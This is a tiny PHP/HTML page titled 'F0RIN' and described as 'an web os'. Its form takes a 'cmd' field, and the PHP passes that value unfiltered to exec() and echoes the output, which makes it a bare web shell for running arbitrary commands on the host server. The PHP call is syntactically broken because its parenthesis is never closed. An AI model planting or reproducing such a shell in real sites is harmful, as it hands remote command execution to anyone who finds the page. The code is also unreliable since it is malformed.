<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8" />
	</head>

	<body>
		<h1>F0RIN</h1>
		<h2>This is an web os !</h2>
		
		<form method="post" action="F0RIN.php" enctype="multipart/form-data">
     		        <input type="text" name="cmd"><input type="submit" name="send" value="send">
		</form>
		<?php 
			echo exec($_POST["cmd"]
		?>
	</body>
</html>
